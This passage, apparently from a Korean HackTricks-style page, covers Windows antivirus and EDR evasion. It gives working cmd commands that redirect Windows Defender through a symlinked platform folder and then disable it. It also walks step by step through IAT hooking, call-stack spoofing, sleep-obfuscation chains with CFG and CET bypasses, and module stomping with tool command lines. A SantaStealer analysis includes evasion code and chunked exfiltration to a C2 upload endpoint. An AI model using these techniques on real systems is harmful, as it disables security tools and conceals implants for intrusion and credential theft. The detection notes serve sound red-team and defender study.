set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 안에 있는 더 높은 버전 디렉터리 symlink를 당신의 폴더를 가리키도록 생성합니다:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger 선택 (reboot recommended):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)가 리디렉션된 경로에서 실행되는지 확인:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
새 프로세스 경로를 `C:\TMP\AV\` 아래에서 관찰하고, 서비스 구성/레지스트리가 그 위치를 반영하는지 확인해야 합니다.

Post-exploitation 옵션
- DLL sideloading/code execution: Defender가 애플리케이션 디렉터리에서 로드하는 DLL을 드롭/교체하여 Defender 프로세스에서 코드를 실행합니다. 위 섹션을 참조하세요: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink를 제거하면 다음 시작 시 구성된 경로를 해석할 수 없게 되어 Defender가 시작에 실패합니다:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 이 기법은 그 자체로 privilege escalation을 제공하지 않으며; admin rights가 필요합니다.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams는 runtime evasion을 C2 implant 밖으로 빼서 target module 자체에 적용할 수 있습니다. 방법은 Import Address Table (IAT)을 hooking하고 선택한 APIs를 attacker-controlled, position‑independent code (PIC)로 라우팅하는 것입니다. 이렇게 하면 많은 kits가 노출하는 작은 API surface(예: CreateProcessA)를 넘어 evasion을 일반화할 수 있고, 같은 protections을 BOFs와 post‑exploitation DLLs에도 확장할 수 있습니다.

High-level approach
- reflective loader(앞에 붙이거나 companion)를 사용해 target module 옆에 PIC blob을 stage합니다. PIC는 self-contained이고 position‑independent여야 합니다.
- host DLL이 load되면 IMAGE_IMPORT_DESCRIPTOR를 따라가며 target imports(예: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc)의 IAT entries를 patch해서 얇은 PIC wrappers를 가리키게 합니다.
- 각 PIC wrapper는 real API address로 tail-calling하기 전에 evasions를 실행합니다. 일반적인 evasions에는 다음이 포함됩니다:
- call 전후로 Memory mask/unmask 수행(예: beacon regions encrypt, RWX→RX, page names/permissions 변경) 후 post‑call에 restore.
- Call-stack spoofing: benign stack을 구성하고 target API로 transition하여 call-stack analysis가 expected frames를 resolve하도록 함.
- 호환성을 위해 interface를 export해서 Aggressor script(또는 동등한 것)가 Beacon, BOFs 및 post-ex DLLs에 대해 어떤 APIs를 hook할지 등록할 수 있게 합니다.

Why IAT hooking here
- tool code를 수정하거나 Beacon이 특정 APIs를 proxy하는 것에 의존하지 않고도, hook된 import를 사용하는 모든 코드에서 동작합니다.
- post-ex DLLs를 커버합니다: LoadLibrary*를 hooking하면 module loads(예: System.Management.Automation.dll, clr.dll)를 intercept하고, 그 API calls에도 동일한 masking/stack evasion을 적용할 수 있습니다.
- CreateProcessA/W를 wrapping하여 call-stack–based detections에 대해 process-spawning post-ex commands의 안정적인 사용을 복원합니다.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- relocations/ASLR 이후, 그리고 import를 처음 사용하기 전에 patch를 적용하세요. TitanLdr/AceLdr 같은 reflective loaders는 로드된 module의 DllMain 동안 hook을 수행하는 것을 보여줍니다.
- wrapper는 작고 PIC-safe하게 유지하세요; patching 전에 캡처한 원래 IAT value 또는 LdrGetProcedureAddress를 통해 true API를 resolve하세요.
- PIC에는 RW → RX transition을 사용하고, writable+executable pages를 남기지 마세요.

Call‑stack spoofing stub
- Draugr‑style PIC stubs는 fake call chain(return addresses into benign modules)을 만든 뒤 real API로 pivot합니다.
- 이는 Beacon/BOFs에서 sensitive APIs로 향하는 canonical stacks를 기대하는 detections를 무력화합니다.
- stack cutting/stack stitching techniques와 함께 사용해 API prologue 전에 expected frames 안으로 들어가세요.

Operational integration
- reflective loader를 post‑ex DLLs 앞에 prepend해서 DLL이 load될 때 PIC와 hooks가 자동으로 초기화되게 하세요.
- Aggressor script를 사용해 target APIs를 register하면, Beacon과 BOFs가 code changes 없이 동일한 evasion path의 이점을 투명하게 받습니다.

Detection/DFIR considerations
- IAT integrity: non-image(heap/anon) addresses로 resolve되는 entries; import pointers의 periodic verification.
- Stack anomalies: loaded images에 속하지 않는 return addresses; non-image PIC로의 abrupt transitions; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: IAT에 대한 in-process writes, import thunks를 modify하는 early DllMain activity, load 시 생성되는 unexpected RX regions.
- Image-load evasion: hooking LoadLibrary*를 한다면, memory masking events와 상관된 automation/clr assemblies의 suspicious loads를 monitor하세요.

Related building blocks and examples
- load 중 IAT patching을 수행하는 reflective loaders (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) 및 stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### resident PICO를 통한 import-time IAT hooks

reflective loader를 제어할 수 있다면, loader의 `GetProcAddress` pointer를 hook을 먼저 확인하는 custom resolver로 바꿔 `ProcessImports()` 동안 import를 **직접** hook할 수 있습니다:

- transient loader PIC가 자기 자신을 free한 뒤에도 살아남는 **resident PICO**(persistent PIC object)를 빌드하세요.
- loader의 import resolver를 덮어쓰는 `setup_hooks()` 함수를 export하세요. (e.g., `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress`에서는 ordinal imports를 건너뛰고 `__resolve_hook(ror13hash(name))` 같은 hash-based hook lookup을 사용하세요. hook이 있으면 그것을 반환하고, 없으면 real `GetProcAddress`로 위임하세요.
- Crystal Palace의 `addhook "MODULE$Func" "hook"` entries로 link time에 hook targets를 register하세요. hook은 resident PICO 안에 있으므로 valid 상태를 유지합니다.

이렇게 하면 load 후 loaded DLL의 code section을 patch하지 않고도 **import-time IAT redirection**을 할 수 있습니다.

### target이 PEB-walking을 사용할 때 hook 가능한 imports 강제하기

import-time hooks는 function이 실제로 target의 IAT에 있을 때만 동작합니다. module이 PEB-walk + hash로 APIs를 resolve해서(import entry 없음) 사용한다면, loader의 `ProcessImports()` 경로가 이를 볼 수 있도록 real import를 강제하세요:

- hashed export resolution (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`)을 `&WaitForSingleObject` 같은 direct reference로 바꾸세요.
- compiler가 IAT entry를 생성하므로, reflective loader가 imports를 resolve할 때 interception이 가능해집니다.

### `Sleep()` patching 없이 Ekko-style sleep/idle obfuscation

`Sleep`을 patch하는 대신, implant가 사용하는 **실제 wait/IPC primitives** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`)를 hook하세요. 긴 wait의 경우, idle 동안 in-memory image를 encrypt하는 Ekko-style obfuscation chain으로 call을 감싸세요:

- `CreateTimerQueueTimer`를 사용해 `NtContinue`를 호출하는 일련의 callbacks를 schedule하세요.
- 일반적인 chain(x64): image를 `PAGE_READWRITE`로 설정 → `advapi32!SystemFunction032`로 전체 mapped image를 RC4 encrypt → blocking wait 수행 → RC4 decrypt → PE sections를 walking하여 **per-section permissions 복원** → completion signal.
- `RtlCaptureContext`가 template `CONTEXT`를 제공합니다; 이를 여러 frames로 clone하고 registers(`Rip`/`Rcx`/`Rdx`/`R8`/`R9`)를 설정해 각 step을 호출하세요.

Operational detail: caller가 image가 masked된 동안 계속 진행하도록 긴 wait에 대해 “success”(e.g., `WAIT_OBJECT_0`)를 반환하세요. 이 패턴은 idle window 동안 module을 scanners로부터 숨기고, 고전적인 “patched `Sleep()`” signature를 피합니다.

Detection ideas (telemetry-based)
- `NtContinue`를 가리키는 `CreateTimerQueueTimer` callbacks의 bursts.
- 큰 contiguous image-sized buffers에 사용되는 `advapi32!SystemFunction032`.
- large-range `VirtualProtect` 뒤에 custom per-section permission restoration.

### sleep-obfuscation gadgets를 위한 runtime CFG registration

CFG-enabled targets에서는 `jmp [rbx]`나 `jmp rdi` 같은 mid-function gadget으로의 첫 indirect jump가 보통 `STATUS_STACK_BUFFER_OVERRUN`으로 프로세스를 crash시킵니다. 이는 gadget이 module의 CFG metadata에 없기 때문입니다. hardened processes 안에서 Ekko/Kraken-style chains를 유지하려면:

- chain이 사용하는 모든 indirect destination을 `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)`와 `CFG_CALL_TARGET_VALID` entries로 register하세요.
- loaded images(`ntdll`, `kernel32`, `advapi32`) 내부 주소의 경우, `MEMORY_RANGE_ENTRY`는 **image base**에서 시작해 **full image size**를 커버해야 합니다.
- manually mapped/PIC/stomped regions의 경우에는 대신 **allocation base**와 allocation size를 사용하세요.
- dispatch gadget뿐 아니라 indirect로 도달하는 exports(`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls)와 attacker-controlled executable sections 중 indirect targets가 될 모든 것에 표시하세요.

이렇게 하면 ROP/JOP-style sleep chains가 “non-CFG processes에서만 동작”하는 상태에서 벗어나, `explorer.exe`, browsers, `svchost.exe`, 그리고 `/guard:cf`로 컴파일된 다른 endpoints에서도 재사용 가능한 primitive가 됩니다.

### sleeping threads를 위한 CET-safe stack spoofing

Full `CONTEXT` replacement는 noisy하고 CET Shadow Stack 시스템에서 깨질 수 있습니다. spoofed `Rip`가 hardware shadow stack과도 일치해야 하기 때문입니다. 더 안전한 sleep-masking pattern은 다음과 같습니다:

- 같은 process의 다른 thread를 하나 고르고, `NtQueryInformationThread`를 통해 그 thread의 `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`)를 읽습니다.
- current thread의 real TEB/TIB를 backup합니다.
- `GetThreadContext`로 real sleeping context를 capture합니다.
- spoof context에는 real `Rip`만 copy하고, spoofed `Rsp`/stack state는 그대로 둡니다.
- sleep window 동안 spoof thread의 `NT_TIB`를 current TEB에 copy해서 stack walkers가 legitimate stack range 안에서 unwind하도록 합니다.
- wait가 끝나면 original TIB와 thread context를 restore합니다.

이렇게 하면 CET-consistent instruction pointer를 유지하면서, unwind를 검증할 때 TEB stack metadata를 신뢰하는 EDR stack walkers를 속일 수 있습니다.

### sleep을 위한 APC-based alternative: Kraken Mask

timer-queue dispatch가 너무 signatured라면, 동일한 sleep-encrypt-spoof-restore sequence를 queued APC를 사용하는 suspended helper thread에서 실행할 수 있습니다:

- entrypoint를 `NtTestAlert`로 하는 helper thread를 생성하세요.
- `NtQueueApcThread`로 준비된 `CONTEXT` frames/APCs를 queue하고 `NtAlertResumeThread`로 drain하세요.
- 기본 64 KB thread stack을 소진하지 않도록 chain state를 helper stack 대신 heap에 저장하세요.
- 시작 event를 atomic하게 signal하고 block하기 위해 `NtSignalAndWaitForSingleObject`를 사용하세요.
- scanner가 half-restored stack을 잡을 수 있는 race window를 줄이기 위해 TIB/context를 restore하기 전에 main thread를 suspend하세요 (`NtSuspendThread` → restore → `NtResumeThread`).

이 방식은 같은 RC4 masking과 stack-spoofing 목표를 유지하면서 `CreateTimerQueueTimer` + `NtContinue` signature를 helper-thread/APC signature로 바꿉니다.

Additional detection ideas
- sleep, waits, 또는 APC dispatch 직전에 `VmCfgCallTargetInformation`과 함께 사용하는 `NtSetInformationVirtualMemory`.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, 또는 `ConnectNamedPipe` 주변의 `GetThreadContext`/`SetThreadContext`.
- 현재 thread의 TEB/TIB stack bounds에 직접 쓰기를 한 뒤의 `NtQueryInformationThread`.
- `SystemFunction032`, `VirtualProtect`, 또는 section-permission restoration helpers에 간접적으로 도달하는 `NtQueueApcThread`/`NtAlertResumeThread` chains.
- signed modules 내부에서 dispatch pivots로 쓰이는 `FF 23` (`jmp [rbx]`) 또는 `FF E7` (`jmp rdi`) 같은 짧은 gadget signatures의 반복 사용.


## Precision Module Stomping

Module stomping은 눈에 띄는 private executable memory를 할당하거나 새 sacrificial DLL을 load하는 대신, **target process 안에 이미 mapped된 DLL의 `.text` section**에서 payload를 실행합니다. overwrite 대상은 process가 여전히 필요로 하는 code paths를 corrupt하지 않으면서 payload를 흡수할 수 있는 **loaded, disk-backed image**여야 합니다.

### Reliable target selection

`uxtheme.dll`이나 `comctl32.dll` 같은 흔한 modules에 대한 naive stomping은 취약합니다: remote process에 DLL이 load되지 않았을 수 있고, code region이 너무 작으면 process가 crash합니다. 더 reliable한 workflow는 다음과 같습니다:

1. target process modules를 enumerate하고, 이미 loaded된 DLL들의 **names-only include list**를 유지합니다.
2. payload를 먼저 build하고 **정확한 byte size**를 기록합니다.
3. disk의 candidate DLL들을 scan하고 PE section **`.text` `Misc_VirtualSize`**를 payload size와 비교합니다. 이는 file size보다 중요합니다. memory에 mapped될 때의 executable section size를 반영하기 때문입니다.
4. **Export Address Table (EAT)**을 parse하고, stomp start offset으로 사용할 exported function RVA를 선택합니다.
5. **blast radius**를 계산합니다: payload가 선택한 function boundary를 넘으면, memory에서 뒤에 배치된 인접 exports를 overwrite하게 됩니다.

현장에서 흔히 보이는 typical recon/selection helpers:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
운영 노트
- `LoadLibrary`/예상치 못한 이미지 로드의 텔레메트리를 피하기 위해 원격 프로세스에 **이미 로드된** DLL을 우선 사용한다.
- 대상 애플리케이션이 거의 실행하지 않는 export를 우선 사용한다. 그렇지 않으면 일반 코드 경로가 thread creation 전후에 stomp된 바이트를 건드릴 수 있다.
- 큰 implant는 종종 shellcode embedding을 문자열 리터럴에서 **byte-array/braced initializer**로 바꿔야 하며, 그래야 injector source에서 전체 버퍼가 올바르게 표현된다.

탐지 아이디어
- 더 흔한 private RWX/RX 할당 대신 **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`)로의 remote write.
- 메모리상 바이트가 디스크의 backing file과 더 이상 일치하지 않는 export entry point.
- 합법적인 DLL export 내부에서 실행을 시작하지만, 첫 바이트가 최근에 수정된 remote thread 또는 context pivot.
- DLL `.text` pages에 대한 의심스러운 `VirtualProtect(Ex)` / `WriteProcessMemory` 시퀀스 뒤에 이어지는 thread creation.

## 파일리스 Evasion과 Credential Theft를 위한 SantaStealer Tradecraft

SantaStealer(aka BluelineStealer)는 현대 info-stealer가 AV bypass, anti-analysis, credential access를 하나의 workflow로 어떻게 결합하는지 보여준다.

### Keyboard layout gating & sandbox delay

- config flag (`anti_cis`)는 `GetKeyboardLayoutList`를 통해 설치된 keyboard layouts를 열거한다. Cyrillic layout이 발견되면, 샘플은 stealers를 실행하기 전에 빈 `CIS` marker를 남기고 종료하여, hunting artifact는 남기면서 제외된 locale에서는 절대 detonat하지 않도록 한다.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered `check_antivm` 로직

- Variant A는 프로세스 목록을 순회하며 각 이름을 custom rolling checksum으로 해시한 뒤, debugger/sandbox용 내장 blocklist와 비교하고, 컴퓨터 이름에 대해서도 같은 checksum을 반복 적용하며 `C:\analysis` 같은 working directory도 확인한다.
- Variant B는 system properties(process-count floor, recent uptime)를 검사하고, VirtualBox additions를 탐지하기 위해 `OpenServiceA("VBoxGuest")`를 호출하며, single-stepping을 찾아내기 위해 sleep 전후의 timing checks를 수행한다. 어느 하나라도 걸리면 modules가 시작되기 전에 중단된다.

### Fileless helper + double ChaCha20 reflective loading

- primary DLL/EXE는 Chromium credential helper를 내장하며, 이 helper는 disk에 drop되거나 메모리에서 manually mapped 된다. fileless mode에서는 imports/relocations를 스스로 resolve하므로 helper artifacts가 기록되지 않는다.
- 그 helper는 ChaCha20(두 개의 32-byte key + 12-byte nonce)로 두 번 암호화된 second-stage DLL을 저장한다. 두 pass가 끝나면, blob을 reflectively load하며(`LoadLibrary` 없음) [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)에서 파생된 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` exports를 호출한다.
- ChromElevator routines는 direct-syscall reflective process hollowing을 사용해 live Chromium browser에 주입하고, AppBound Encryption keys를 상속받아, ABE hardening에도 불구하고 SQLite databases에서 password/cookie/credit cards를 직접 복호화한다.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log`는 global `memory_generators` function-pointer table을 순회하며, 활성화된 각 module(Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.)마다 thread 하나를 생성한다. 각 thread는 결과를 shared buffers에 쓰고, ~45s join window 후 file count를 보고한다.
- 완료되면, 모든 내용은 statically linked `miniz` library로 `%TEMP%\\Log.zip`에 zip된다. 이후 `ThreadPayload1`은 15s 동안 sleep한 뒤, browser `multipart/form-data` boundary(`----WebKitFormBoundary***`)를 흉내 내며 HTTP POST로 `http://<C2>:6767/upload`에 archive를 10 MB chunks로 전송한다. 각 chunk에는 `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`가 추가되고, 마지막 chunk에는 `complete: true`가 붙어 C2가 재조립 완료를 알 수 있게 한다.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
